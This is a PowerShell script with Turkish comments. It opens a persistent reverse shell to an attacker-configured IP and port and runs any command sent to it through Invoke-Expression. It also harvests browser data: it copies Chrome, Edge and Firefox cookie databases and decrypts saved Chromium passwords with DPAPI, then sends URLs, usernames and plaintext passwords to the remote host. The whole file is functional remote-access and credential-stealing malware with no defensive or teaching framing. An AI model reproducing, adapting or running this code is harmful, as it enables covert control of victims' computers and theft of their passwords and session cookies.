$server = "10.10.10.10"  # <-- IP'ni değiştir
$port = 9001             # <-- Portunu değiştir

function Connect-ReverseShell {
    while ($true) {
        try {
            $client = New-Object Net.Sockets.TCPClient($server, $port)
            $stream = $client.GetStream()
            $reader = New-Object IO.StreamReader($stream)
            $writer = New-Object IO.StreamWriter($stream)
            $writer.AutoFlush = $true

            $writer.WriteLine("[+] Connected from $env:COMPUTERNAME ($env:USERNAME)")

            # Browser verilerini çek ve gönder
            Send-BrowserData $writer

            while ($client.Connected) {
                try {
                    $cmd = $reader.ReadLine()
                    if ($null -eq $cmd) { break }

                    if ($cmd -eq "exit" -or $cmd -eq "quit") {
                        $writer.WriteLine("[+] Goodbye!")
                        break
                    }

                    $output = Invoke-Expression $cmd 2>&1 | Out-String
                    $writer.WriteLine($output)
                }
                catch {
                    $writer.WriteLine("ERROR: $($_.Exception.Message)")
                }
            }
        }
        catch {
            # Bağlantı hatası olursa sessizce bekle ve tekrar dene
        }
        finally {
            if ($client) { $client.Close() }
            Start-Sleep -Seconds 10  # 10 saniye sonra tekrar bağlan
        }
    }
}

function Send-BrowserData {
    param($writer)

    $writer.WriteLine("`n[*] Tarayici verileri toplanıyor...`n")

    $browsers = @(
        @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default"},
        @{Name="Edge";   Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"},
        @{Name="Firefox"; Path="$env:APPDATA\Mozilla\Firefox\Profiles"}
    )

    foreach ($browser in $browsers) {
        try {
            if (Test-Path $browser.Path) {
                $writer.WriteLine("[+] $($browser.Name) bulundu")

                # Cookies
                $cookiePaths = @()
                if ($browser.Name -eq "Firefox") {
                    $profiles = Get-ChildItem "$($browser.Path)\*.default-release" -Directory
                    foreach ($p in $profiles) { $cookiePaths += "$($p.FullName)\cookies.sqlite" }
                } else {
                    $cookiePaths += "$($browser.Path)\Network\Cookies"
                }

                foreach ($cp in $cookiePaths) {
                    if (Test-Path $cp) {
                        Copy-Item $cp "$env:TEMP\cookies_$(Get-Random).tmp" -Force
                        $size = (Get-Item "$env:TEMP\cookies_*.tmp").Length
                        $writer.WriteLine("    Cookie DB: $cp (boyut: $size bytes)")
                        Remove-Item "$env:TEMP\cookies_*.tmp" -Force
                    }
                }

                # Login Data (şifreler)
                $loginPath = "$($browser.Path)\Login Data"
                if (Test-Path $loginPath -and $browser.Name -ne "Firefox") {
                    Copy-Item $loginPath "$env:TEMP\logins.tmp" -Force
                    try {
                        $conn = New-Object Data.SQLite.SQLiteConnection("Data Source=$env:TEMP\logins.tmp")
                        $conn.Open()
                        $cmd = $conn.CreateCommand()
                        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
                        $r = $cmd.ExecuteReader()
                        $count = 0
                        while ($r.Read()) {
                            $url = $r.GetString(0)
                            $user = $r.GetString(1)
                            $encPass = $r.GetValue(2)
                            try {
                                $decPass = [Runtime.InteropServices.Marshal]::PtrToStringUni([Runtime.InteropServices.Marshal]::SecureStringToBSTR((New-Object Security.SecureString)))
                                # DPAPI decrypt (Chrome/Edge)
                                $decPass = [Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser'))
                                $writer.WriteLine("    Şifre: $url | $user | $decPass")
                                $count++
                            } catch {}
                        }
                        $r.Close()
                        $conn.Close()
                        if ($count -eq 0) { $writer.WriteLine("    Kaydedilmiş şifre yok veya decrypt edilemedi") }
                    } catch {
                        $writer.WriteLine("    Login Data okunamadı (kilitli olabilir)")
                    }
                    Remove-Item "$env:TEMP\logins.tmp" -Force
                }

                # History
                $historyPath = "$($browser.Path)\History"
                if (Test-Path $historyPath -and $browser.Name -ne "Firefox") {
                    Copy-Item $historyPath "$env:TEMP\history.tmp" -Force
                    $writer.WriteLine("    History DB bulundu")
                    Remove-Item "$env:TEMP\history.tmp" -Force
                }
            }
        } catch {
            $writer.WriteLine("[-] $($browser.Name) hatası: $($_.Exception.Message)")
        }
    }

    $writer.WriteLine("`n[*] Tarayici verileri toplama tamamlandı.`n")
}

Connect-ReverseShell
